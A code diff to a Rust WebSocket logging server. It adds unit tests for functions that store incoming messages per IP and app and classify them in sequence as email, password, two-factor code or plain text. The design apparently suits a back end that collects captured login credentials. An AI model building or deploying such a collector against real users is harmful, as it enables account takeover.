@@ -72,7 +72,7 @@ pub mod server {
             while let Some(msg) = stream.next().await {
                 match msg {
                     Ok(AggregatedMessage::Text(msg)) => match parse_message(msg.to_string()) {
-                        Ok(payload) => match store_db(payload, &database.pool).await {
+                        Ok(payload) => match store_db(&payload, &database.pool).await {
                             Ok(()) => {}
                             Err(err) => {
                                 eprintln!(
@@ -267,7 +267,7 @@ pub mod db {
         }
     }
 
-    pub async fn store_db(payload: LogPayload, pool: &Pool<Sqlite>) -> Result<(), sqlx::Error> {
+    pub async fn store_db(payload: &LogPayload, pool: &Pool<Sqlite>) -> Result<(), sqlx::Error> {
         let content_type = check_content(&payload, pool).await?;
 
         sqlx::query(
@@ -286,6 +286,7 @@ pub mod db {
         Ok(())
     }
 
+    #[derive(Debug, PartialEq)]
     enum ContentTypes {
         Email,
         Password,
@@ -301,6 +302,426 @@ pub mod db {
                 ContentTypes::TFA => write!(f, "TFA"),
                 ContentTypes::PlainText => write!(f, "PlainText"),
             }
+        }
+    }
+
+    #[cfg(test)]
+    mod test {
+        use sqlx::{SqlitePool, sqlite::SqliteConnectOptions};
+
+        use super::Database;
+        use crate::{
+            db::{ContentTypes, check_content, check_last_log_type, store_db},
+            server::LogPayload,
+        };
+        use std::{net::Ipv4Addr, str::FromStr};
+
+        async fn setup_database(name: &str) -> Result<Database, sqlx::Error> {
+            let options = SqliteConnectOptions::from_str(&format!("sqlite://{name}.db"))?
+                .create_if_missing(true);
+
+            let pool = SqlitePool::connect_with(options).await?;
+
+            sqlx::query(
+                r#"
+                    CREATE TABLE IF NOT EXISTS logs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    ip TEXT,
+                    app TEXT,
+                    content TEXT,
+                    type TEXT
+                    );
+            "#,
+            )
+            .execute(&pool)
+            .await?;
+
+            Ok(Database { pool })
+        }
+
+        #[tokio::test]
+        async fn it_creates_a_new_database() {
+            assert!(Database::new().await.is_ok());
+
+            // clean up
+            std::fs::remove_file("./seraphim.db").expect("Failed to clean database.");
+        }
+
+        #[tokio::test]
+        async fn it_stores_data_in_database() {
+            let payload = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo"),
+            };
+
+            let db = setup_database("test_store")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let query = "SELECT ip, app, content FROM logs ORDER BY id DESC LIMIT 1";
+
+            let result: Option<(String, String, String)> = sqlx::query_as(query)
+                .fetch_optional(&db.pool)
+                .await
+                .expect("Query failed");
+
+            let result = result.expect("No row found in database");
+
+            assert_eq!(result.0, "127.0.0.1");
+            assert_eq!(result.1, "test_app");
+            assert_eq!(result.2, "foo");
+
+            // clean up
+            std::fs::remove_file("./test_store.db").expect("Failed to clean database.");
+        }
+
+        #[tokio::test]
+        async fn it_checks_last_log_type_plain_text() {
+            let payload = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo"),
+            };
+
+            let db = setup_database("test_last_log_plain")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result = check_last_log_type(&payload.ip.to_string(), &payload.app, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Some(result_content) = result.unwrap() {
+                assert_eq!(result_content, "PlainText");
+            }
+
+            // clean up
+            std::fs::remove_file("./test_last_log_plain.db").expect("Failed to clean database.");
+        }
+
+        #[tokio::test]
+        async fn it_checks_last_log_type_email() {
+            let payload = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo@example.com"),
+            };
+
+            let db = setup_database("test_last_log_email")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result = check_last_log_type(&payload.ip.to_string(), &payload.app, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Some(result_content) = result.unwrap() {
+                assert_eq!(result_content, "Email");
+            }
+
+            // clean up
+            std::fs::remove_file("./test_last_log_email.db").expect("Failed to clean database.");
+        }
+
+        #[tokio::test]
+        async fn it_checks_last_log_type_password() {
+            let payload_email = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo@example.com"),
+            };
+
+            let payload_pass = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("123"),
+            };
+
+            let db = setup_database("test_last_log_password")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload_email, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            store_db(&payload_pass, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result =
+                check_last_log_type(&payload_pass.ip.to_string(), &payload_pass.app, &db.pool)
+                    .await;
+
+            assert!(result.is_ok());
+
+            if let Some(result_content) = result.unwrap() {
+                assert_eq!(result_content, "Password");
+            }
+
+            // clean up
+            std::fs::remove_file("./test_last_log_password.db").expect("Failed to clean database.");
+        }
+
+        #[tokio::test]
+        async fn it_checks_last_log_type_tfa() {
+            let payload_email = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo@example.com"),
+            };
+
+            let payload_pass = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("123"),
+            };
+
+            let payload_tfa = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("123-456"),
+            };
+
+            let db = setup_database("test_last_log_tfa")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload_email, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            store_db(&payload_pass, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            store_db(&payload_tfa, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result =
+                check_last_log_type(&payload_tfa.ip.to_string(), &payload_tfa.app, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Some(result_content) = result.unwrap() {
+                assert_eq!(result_content, "TFA");
+            }
+
+            // clean up
+            std::fs::remove_file("./test_last_log_tfa.db").expect("Failed to clean database.");
+        }
+
+        #[tokio::test]
+        async fn it_checks_content_type_plain() {
+            let payload = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo"),
+            };
+
+            let db = setup_database("test_check_content_plain")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result = check_content(&payload, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Ok(result_content) = result {
+                assert_eq!(result_content, ContentTypes::PlainText);
+            }
+
+            // clean up
+            std::fs::remove_file("./test_check_content_plain.db")
+                .expect("Failed to clean database.");
+        }
+
+        #[tokio::test]
+        async fn it_checks_content_type_plain_with_older_row() {
+            let payload_a = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo"),
+            };
+
+            let payload_b = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("blah"),
+            };
+
+            let db = setup_database("test_check_content_plain_older")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload_a, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            store_db(&payload_b, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result = check_content(&payload_b, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Ok(result_content) = result {
+                assert_eq!(result_content, ContentTypes::PlainText);
+            }
+
+            // clean up
+            std::fs::remove_file("./test_check_content_plain_older.db")
+                .expect("Failed to clean database.");
+        }
+        
+        #[tokio::test]
+        async fn it_checks_content_type_email() {
+            let payload = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo@example.com"),
+            };
+
+            let db = setup_database("test_check_content_email")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result = check_content(&payload, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Ok(result_content) = result {
+                assert_eq!(result_content, ContentTypes::Email);
+            }
+
+            // clean up
+            std::fs::remove_file("./test_check_content_email.db").expect("Failed to clean database.");
+        }
+        
+        #[tokio::test]
+        async fn it_checks_content_type_email_without_previous_content() {
+            let payload = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo@example.com"),
+            };
+
+            let db = setup_database("test_check_content_email_without")
+                .await
+                .expect("Failed to create database");
+
+            let result = check_content(&payload, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Ok(result_content) = result {
+                assert_eq!(result_content, ContentTypes::Email);
+            }
+
+            // clean up
+            std::fs::remove_file("./test_check_content_email_without.db").expect("Failed to clean database.");
+        }
+
+        #[tokio::test]
+        async fn it_checks_content_type_password() {
+            let payload = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo@example.com"),
+            };
+
+            let payload_b = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("12345"),
+            };
+
+            let db = setup_database("test_check_content_password")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result = check_content(&payload_b, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Ok(result_content) = result {
+                assert_eq!(result_content, ContentTypes::Password);
+            }
+
+            // clean up
+            std::fs::remove_file("./test_check_content_password.db").expect("Failed to clean database.");
+        }
+        
+        #[tokio::test]
+        async fn it_checks_content_type_tfa() {
+            let payload = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("foo@example.com"),
+            };
+
+            let payload_b = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("12345"),
+            };
+
+            let payload_c = LogPayload {
+                ip: Ipv4Addr::new(127, 0, 0, 1),
+                app: String::from("test_app"),
+                content: String::from("123-456"),
+            };
+
+            let db = setup_database("test_check_content_tfa")
+                .await
+                .expect("Failed to create database");
+
+            store_db(&payload, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            store_db(&payload_b, &db.pool)
+                .await
+                .expect("Failed to store data");
+
+            let result = check_content(&payload_c, &db.pool).await;
+
+            assert!(result.is_ok());
+
+            if let Ok(result_content) = result {
+                assert_eq!(result_content, ContentTypes::TFA);
+            }
+
+            // clean up
+            std::fs::remove_file("./test_check_content_tfa.db").expect("Failed to clean database.");
         }
     }
 }
